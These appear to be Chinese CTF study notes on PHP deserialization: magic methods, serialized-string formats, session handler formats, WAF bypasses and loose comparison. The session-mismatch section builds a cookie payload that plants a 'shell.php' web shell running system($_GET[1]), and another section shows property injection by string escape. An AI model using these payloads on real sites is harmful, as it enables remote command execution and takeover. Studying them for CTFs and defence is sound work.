
## 魔术方法

| 魔术方法                             | 触发条件                                                                                                 | POP 链角色          | CTF 核心考点与利用技巧 (CTF Tips)                                                                                                            |
| :------------------------------- | :--------------------------------------------------------------------------------------------------- | :--------------- | :---------------------------------------------------------------------------------------------------------------------------------- |
| **`__wakeup()`**                 | 执行 `unserialize()` 反序列化成功时。                                                                          | **起点 (Entry)**   | 常用于初始化或安全净化。可利用 **CVE-2016-7124 绕过**：将序列化字符串中的属性个数修改为大于实际个数的值。                                                                      |
| **`__unserialize(array $data)`** | 执行 `unserialize()` 反序列化成功时（PHP 7.4+）。如果类中同时存在 `__unserialize` 和 `__wakeup`，则**仅触发** `__unserialize`。 | **起点 (Entry)**   | PHP 7.4+ 引入。由于其优先级高于 `__wakeup`，传统的 CVE-2016-7124 绕过对此方法无效。该方法接收反序列化后的数组 `$data` 并恢复成员变量，如果在恢复成员变量时存在动态赋值或拼接，可作为漏洞触发点。              |
| **`__destruct()`**               | 对象被销毁、生命周期结束、或脚本执行完毕时。                                                                               | **起点 (Entry)**   | 最稳健、最常用的入口。只要脚本运行结束或变量被覆盖/销毁，就必然会自动触发。                                                                                              |
| **`__sleep()`**                  | 执行 `serialize()` 序列化对象之前。                                                                            | 辅助起点 / 特定场景      | 必须返回一个包含所有需要被序列化的属性名称的数组。如果 CTF 题目流程中存在对用户可控对象进行 `serialize()` 的操作，可尝试利用。在 PHP 7.4+ 中，如果类中同时定义了 `__serialize()`，则 `__sleep()` 会被忽略。 |
| **`__toString()`**               | 对象被当作**字符串**对待或进行隐式转换时（如 `echo $obj`、`$str . $obj`、`preg_match` 等）。                                  | **中继点 (Bridge)** | 高频中继。如果在 `__destruct()` 中看到处理字符串的操作，可将其赋值为含有 `__toString` 的对象进行跨类跳转。                                                                |
| **`__get($name)`**               | 读取对象**不可访问（private/protected）**或**不存在**的属性时。                                                         | **中继点 (Bridge)** | 常用于属性转换。例如，当链条下一步需要读取某个属性，可通过给该属性赋值一个没有此成员的对象来强行触发。                                                                                 |
| **`__set($name, $val)`**         | 给对象**不可访问**或**不存在**的属性赋值时。                                                                           | **中继点 (Bridge)** | 与 `__get` 类似，可作为属性写入时的中继跳转。                                                                                                         |
| **`__call($name, $args)`**       | 调用对象**不可访问**或**不存在**的方法时。                                                                            | **中继点 (Bridge)** | 极佳的中继。如果前一步代码出现了 `$this->handler->close()`，而控制的 `handler` 对象没有 `close` 方法，即可进入此方法。                                                  |
| **`__invoke()`**                 | 尝试以**调用函数（或匿名函数）**的方式调用一个对象时（如 `$obj()`）。                                                            | **中继点 (Bridge)** | 如果上一步代码存在动态函数调用（如 `$func()`），可将 `$func` 替换为含有此方法的对象。                                                                                |
| **`__isset($name)`**             | 对不可访问或不存在的属性调用 `isset()` 或 `empty()` 时。                                                              | 辅助中继             | 偶尔作为特定逻辑的辅助跳转。                                                                                                                      |
| **`__unset($name)`**             | 对不可访问或不存在的属性调用 `unset()` 时。                                                                          | 辅助中继             | 偶尔作为特定逻辑的辅助跳转。                                                                                                                      |
| **`__construct()`**              | 在使用 `new` 关键字创建对象实例时。                                                                                | *不触发*            | **CTF 易错点**：**反序列化（`unserialize`）时不会触发此方法**。如需利用该方法内的代码，通常不能直接依靠反序列化。                                                               |

## HTTP 中的Cookie
浏览器发送给服务器的 Cookie 格式是**以分号和空格（;）间隔的键值对**。
其标准格式如下：
```HTTP
Cookie: key1=value1; key2=value2; key3=value3
```

## 序列化字符串的结构

### 标准 serialize() 格式（php_serialize handler）

PHP 序列化后的字符串是一串具有特定规则的文本，用于描述变量的**类型**和**结构**。它的基本设计思想是：**“类型标识符 : 数据内容”**，不同类型的数据有不同的固定格式。

以下是 PHP 序列化字符串中各个数据类型的结构详解：

---

#### 一、 基础数据类型

| 数据类型 | 格式 | 示例 | 解释 |
| :--- | :--- | :--- | :--- |
| **Null** | `N;` | `N;` | 无值 |
| **Boolean** | `b:<0或1>;` | `b:1;` | `true` 为 1，`false` 为 0 |
| **Integer** | `i:<数值>;` | `i:123;` | 整数 123 |
| **Double / Float** | `d:<数值>;` | `d:12.34;` | 浮点数 12.34 |
| **String** | `s:<长度>:"<字符串内容>";` | `s:5:"hello";` | 长度为 5 的字符串 "hello" |

---

#### 二、 复合数据类型（数组与对象）

##### 1. 数组 (Array)
数组的结构包含**元素个数**，以及大括号 `{}` 内的**键值对**（键和值也都是序列化后的格式）。
*   **结构**：`a:<元素个数>:{键1;值1;键2;值2;...}`
*   **示例**：
    ```php
    // 原数组：[0 => "apple", "color" => "red"]
    a:2:{i:0;s:5:"apple";s:5:"color";s:3:"red";}
    ```

##### 2. 对象 (Object)
对象的结构包含**类名长度**、**类名**、**属性个数**，以及大括号 `{}` 内的**成员属性名与属性值**。
*   **结构**：`O:<类名长度>:"<类名>":<属性个数>:{属性名1(序列化);属性值1(序列化);...}`
*   **示例**：
    ```php
    // 假设有一个类名为 User 的对象，含有一个公有属性 $name = "admin"
    O:4:"User":1:{s:4:"name";s:5:"admin";}
    ```

---

#### 三、 引用类型 (Reference)

引用（Reference）让多个变量指向同一块内存，一个改全部跟着改。在序列化中，引用通过 `R:N` 语法表示。

##### 1. 引用格式
*   **结构**：`R:<编号>;`
*   **示例**：
    ```php
    // password 引用 token 的值位置
    R:2;
    ```

##### 2. 如何产生
*   **方式**：PHP 中用 `&` 引用运算符建立引用关系后序列化，PHP 自动生成引用标记
*   **示例**：
    ```php
    $o = new ctfshowAdmin();
    $o->password = &$o->token;   // 建立引用
    echo serialize($o);
    ```
    ```php
    // 输出
    O:12:"ctfshowAdmin":2:{s:5:"token";N;s:8:"password";R:2;}
    ```
*   **规则**：编号按值在序列化字符串中出现的顺序从 1 开始计数。反序列化后引用关系保留，修改原属性，引用属性同步变化。

**编号对照**：以上述输出为例，`N;` 为第 1 个值（token 的值位置），`R:2;` 中的 `2` 指向第 2 个值（即 token 属性本身），因此 password 与 token 共享同一内存。

---

#### 四、 对象属性可见性对结构的影响

在对象序列化中，**属性的可见性（Public/Protected/Private）会直接改变属性名（Key）的序列化字符串和长度**。这是安全领域（如反序列化漏洞）中需要特别注意的细节。

##### 1. Public（公有属性）
*   **格式**：`属性名`
*   **示例**：`public $name;` -> 序列化后为 `s:4:"name";`

##### 2. Protected（受保护属性）
*   **格式**：`\x00*\x00属性名`（其中 `\x00` 代表空字节 Null Byte）
*   **规则**：属性名前会加上 `\x00*\x00`。因为有两个空字节和一个星号，所以**长度会在实际属性名长度的基础上加 3**。
*   **示例**：`protected $name;` -> 序列化后为 `s:7:"\x00*\x00name";`（`name`长度4，加上`\x00*\x00`长度3，总长7）

##### 3. Private（私有属性）
*   **格式**：`\x00类名\x00属性名`（其中 `\x00` 代表空字节 Null Byte）
*   **规则**：属性名前会加上 `\x00类名\x00`。所以**长度会在（属性名长度 + 类名长度）的基础上加 2**。
*   **示例**：在 `User` 类中定义 `private $name;` -> 序列化后为 `s:10:"\x00User\x00name";`（`User`长度4 + `name`长度4 + 两个空字节长度2 = 10）

---

#### 五、 完整示例解析

假设有如下 PHP 代码：

```php
class Test {
    public $pub = "A";
    protected $pro = "B";
    private $pri = "C";
}
$obj = new Test();
echo serialize($obj);
```

其序列化输出结果的逻辑结构拆解如下：

```text
O:4:"Test":3:{s:3:"pub";s:1:"A";s:6:"\x00*\x00pro";s:1:"B";s:10:"\x00Test\x00pri";s:1:"C";}
```

*   `O:4:"Test":3:`：代表这是一个**对象（O）**，类名长度为 **4**（`Test`），含有 **3** 个属性。
*   `s:3:"pub";s:1:"A";`：公有属性 `pub`，值为字符串 `"A"`。
*   `s:6:"\x00*\x00pro";s:1:"B";`：受保护属性 `pro`（长度 3 + 3 = 6），值为字符串 `"B"`。
*   `s:10:"\x00Test\x00pri";s:1:"C";`：私有属性 `pri`（长度 4 + 4 + 2 = 10），值为字符串 `"C"`。

### php handler 格式

`php` 是 PHP 默认的 session 序列化处理器（session serialize handler），专门用于将 `$_SESSION` 数组写入文件、从文件还原。与标准 `serialize()` 函数输出不同，它用 `|` 分隔键名和值。

---

#### 会话文件存储

| 项目 | 说明 |
|------|------|
| 存储位置 | `session.save_path` 配置决定，默认 `/tmp` |
| 文件名 | `sess_` + `PHPSESSID`（例如 `sess_abc123`） |
| 读写时机 | `session_start()` 时读取，请求结束时自动写入 |

查看 session 文件原始内容：
```bash
cat /tmp/sess_$(你的PHPSESSID)
```

---

#### 基本格式规则

**格式**：`键名|序列化后的值`，多个键值对直接拼接。

```
键1|值1的序列化字符串;键2|值2的序列化字符串;...
```

**反序列化规则**：
1. 从左到右扫描，找到第一个 `|`
2. `|` **前面** → 键名
3. `|` **后面** → 调用 `unserialize()` 读取一个完整的 PHP 序列化值
4. `unserialize()` 消费完一个值后，重复步骤 1

---

#### 数据类型存储一览

以下示例均用 PHP 命令行可复现：
```bash
php -r '
session_save_path("/tmp");
ini_set("session.use_cookies", "0");
session_id("demotype");
ini_set("session.serialize_handler", "php");
session_start();
// 放一个值进去
$_SESSION["key"] = 值;
session_write_close();
echo file_get_contents("/tmp/sess_demotype");
'
```

##### String

```php
$_SESSION['name'] = 'hello';
// 文件内容: name|s:5:"hello";
//                    ↑ 5 个字符的字符串 "hello"
```

##### Integer

```php
$_SESSION['count'] = 42;
// 文件内容: count|i:42;
//                   ↑ 整数 42
```

##### Boolean

```php
$_SESSION['flag'] = true;
// 文件内容: flag|b:1;
//                  ↑ true=1, false=0
```

##### Null

```php
$_SESSION['data'] = null;
// 文件内容: data|N;
//                 ↑ null
```

##### Array

```php
$_SESSION['items'] = ['a', 'b', 'c'];
// 文件内容: items|a:3:{i:0;s:1:"a";i:1;s:1:"b";i:2;s:1:"c";}
//                  ↑ 标准 serialize 的数组（元素个数 3）
```

##### Object

```php
$_SESSION['user'] = new User();
// 文件内容: user|O:4:"User":1:{s:4:"name";s:5:"admin";}
//                 ↑ 标准 serialize 的对象
```

---

#### 完整示例

一段 PHP 代码产生多个不同类型的 session 值：

```php
$_SESSION['name'] = 'admin';
$_SESSION['count'] = 18;
$_SESSION['tags'] = ['php', 'ctf'];
$_SESSION['vip'] = true;
```

`php` handler 写入文件的内容：

```
name|s:5:"admin";count|i:18;tags|a:2:{i:0;s:3:"php";i:1;s:3:"ctf";}vip|b:1;
```

`session_start()` 用 `php` handler 解析后：

```php
$_SESSION = [
    'name' => 'admin',           // string
    'count' => 18,               // int
    'tags' => ['php', 'ctf'],    // array
    'vip' => true,               // bool
];
```

---

## Session Handler 不匹配漏洞

### 原理

写 session 时用 `php_serialize` handler，读 session 时用 `php` handler，两者格式不同导致 `|` 被误解析为 key-value 分隔符，`|` 之后的内容被 `unserialize()` 执行，造成任意反序列化。

### 必要条件

1. 写入 handler ≠ 读取 handler（通常 php.ini 默认 `php_serialize`，代码内 `ini_set('php')`）
2. session 值中包含 `|` 字符（通常通过 `$_SESSION['xxx'] = base64_decode($_COOKIE['xxx'])` 注入）
3. `|` 之后是一个合法的 PHP 序列化字符串

### 快速本地验证

```php
<?php
// 步骤 1：用 php_serialize handler 写 session
session_save_path('.');
ini_set('session.use_cookies', '0');
session_id('test');
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['limit'] = 'x|O:4:"User":3:{s:8:"username";s:5:"a.php";s:8:"password";s:22:"<?=system($_GET[1]);?>";s:6:"status";b:1;}';
session_write_close();

echo "session 文件内容: " . file_get_contents('./sess_test') . "\n\n";

// 步骤 2：用 php handler 读同一个 session 文件
session_id('test');
ini_set('session.serialize_handler', 'php');
session_start();
print_r($_SESSION);  // 可以看到反序列化出来的 User 对象
session_destroy();
```

### 常见 Payload 构造

```php
<?php
class User {
    public $username = 'shell.php';
    public $password = '<?=system($_GET[1]);?>';
    public $status = true;
}

$payload = 'x|' . serialize(new User());
$cookie = base64_encode($payload);

echo "序列化结果: $payload\n";
// 输出: x|O:4:"User":3:{s:8:"username";s:9:"shell.php";s:8:"password";s:22:"<?=system($_GET[1]);?>";s:6:"status";b:1;}

echo "Cookie值: $cookie\n";
// 输出: eHxPOjQ6IlVzZXIiOjM6e3M6ODoidXNlcm5hbWUiO3M6OToic2hlbGwucGhwIjtzOjg6InBhc3N3b3JkIjtzOjIyOiI8Pz1zeXN0ZW0oJF9HRVRbMV0pOz8+IjtzOjY6InN0YXR1cyI7YjoxO30=
```

### 注意

- 反序列化的类必须和 `session_start()` 在**同一个文件**中（PHP 编译期注册），否则生成 `__PHP_Incomplete_Class`，`__destruct` 不会触发
- 两个访问路径必须使用**同一个 PHPSESSID**
- 通常先访问写 handler 的页面（index.php），再访问读 handler 的页面（check.php）

---

## WAF绕过 & 逃逸
### 序列化正负号构造
- php的反序列化支持数字的正负号
所以
```text
O:4:"Test":3:
```
可以写成
```
O:+4:"Test":3:
```
可以规避掉某些正则匹配

### 字符串转数字
- 字符串和数字做松散比较的时候，字符串会转换为数字
例如
```php
//（截取开头的数字，直到遇到非数字）
echo("877.php" == 0x36d);
// Output:1 
```
这是成立的

### 字符增多逃逸

字符串替换使序列化值变长，`s:L` 声明的长度不变，导致实际内容超出声明长度，多出的字节被当作后续序列化数据解析，实现属性注入。

**典型场景**：`str_replace('fuck', 'loveU', serialize($msg))` — 4 字节变 5 字节，净增 1 字节/次

#### 核心公式

**定义**：原关键字长度 $a$，新关键字长度 $b$，每次替换净增 $d = b - a$。  
替换次数 $N$，注入 payload 长度 $L$。

**核心等式**：
$$N \cdot d = L$$

**解析过程**：
$$s:L\ \text{读}\ L\ \text{字节} \Rightarrow \text{第}\ L+1\ \text{字节起为注入内容，被解析器当作后续属性}$$

**简单例子**（`fuck` → `loveU`，$a=4,\ b=5,\ d=1$）：
$$N = L$$

#### Payload 构造模板

```php
<?php
// 原关键字 'fuck' → 新关键字 'loveU'，每次净增 d = 5-4 = 1 字节
// 注入的序列化数据长度为 L，需替换次数 N = L / d（d=1 时 N = L）

$inject  = '";s:X:"prop";s:Y:"value";}';  // 要注入的属性序列化片段
$N = strlen($inject);  // d=1 时，N 等于注入长度

// 构造输入：N 次关键字 + 注入内容
// 替换后 s:L 读完 N×loveU，inject 被当作后续属性解析
$input = str_repeat('fuck', $N) . $inject;
```

#### 简单例子

```php
<?php
class User {
    public $role = 'guest';    // 目标：改成 admin
    public $username;           // 可控属性
}

// 注入 payload：";s:4:"role";s:5:"admin";}  （长度 L = 27）
// 需要替换次数 N = L = 27（每次净增 1）
$username = str_repeat('fuck', 27) . '";s:4:"role";s:5:"admin";}';

$u = new User();
$u->username = $username;

$s = serialize($u);
// 替换前: O:6:"User":2:{s:4:"role";s:5:"guest";s:8:"username";s:135:"fuck×27";s:4:"role";s:5:"admin";}";}

$us = str_replace('fuck', 'loveU', $s);
// 替换后: O:6:"User":2:{s:4:"role";s:5:"guest";s:8:"username";s:135:"loveU×27";s:4:"role";s:5:"admin";}";}

// 解析器视角：
// s:135:"loveU×27";    ← 读 135 字节（恰好 27×loveU），正常闭合
// ";s:4:"role";s:5:"admin";}"  ← 被当作第 2 个属性，role = admin
// }                         ← 对象结束
// 原始序列化的 ";s:4:"role";s:5:"guest";... 变成尾部垃圾被忽略

$r = unserialize($us);
// $r->role === 'admin'
```





### 引用绕过

- **原理**：利用 PHP 序列化的引用标记 `R:N` 让多个属性指向同一内存，绕过反序列化后服务端对属性的独立赋值或校验
- **简单例子**：
    ```php
    <?php
    class ctfshowAdmin {
        public $token;
        public $password;
        public function login(){
            return $this->token === $this->password;
        }
    }

    // 步骤 1：构造 payload——让 password 引用 token
    $o = new ctfshowAdmin();
    $o->password = &$o->token;          // 建立引用关系
    echo serialize($o) . "\n";
    // 输出：O:12:"ctfshowAdmin":2:{s:5:"token";N;s:8:"password";R:2;}

    // 步骤 2：模拟服务端逻辑
    $ctfshow = unserialize('O:12:"ctfshowAdmin":2:{s:5:"token";N;s:8:"password";R:2;}');
    $ctfshow->token = md5(mt_rand());   // 服务端覆盖 token 为随机值
                                        // password 因引用关系同步变化，两者永远相等
    var_dump($ctfshow->login());
    // 输出：bool(true)
    ```

## 松散比较表

| 操作数     | `true` | `false` | `1`   | `0`    | `-1`  | `"1"` | `"0"` | `"-1"` | `null` | `[]`  | `"php"` | `""`   |
| ------- | ------ | ------- | ----- | ------ | ----- | ----- | ----- | ------ | ------ | ----- | ------- | ------ |
| `true`  | true   | false   | true  | false  | true  | true  | false | true   | false  | false | true    | false  |
| `false` | false  | true    | false | true   | false | false | true  | false  | true   | true  | false   | true   |
| `1`     | true   | false   | true  | false  | false | true  | false | false  | false  | false | false   | false  |
| `0`     | false  | true    | false | true   | false | false | true  | false  | true   | false | false*  | false* |
| `-1`    | true   | false   | false | false  | true  | false | false | true   | false  | false | false   | false  |
| `"1"`   | true   | false   | true  | false  | false | true  | false | false  | false  | false | false   | false  |
| `"0"`   | false  | true    | false | true   | false | false | true  | false  | false  | false | false   | false  |
| `"-1"`  | true   | false   | false | false  | true  | false | false | true   | false  | false | false   | false  |
| `null`  | false  | true    | false | true   | false | false | false | false  | true   | true  | false   | true   |
| `[]`    | false  | true    | false | false  | false | false | false | false  | true   | true  | false   | false  |
| `"php"` | true   | false   | false | false* | false | false | false | false  | false  | false | true    | false  |
| `""`    | false  | true    | false | false* | false | false | false | false  | true   | false | false   | true   |

> [!attention] 注意
表格中的 `*` 表示该结果在 PHP 8.0.0 **之前**为 `true`，从 PHP 8.0.0 开始才变为 `false`。

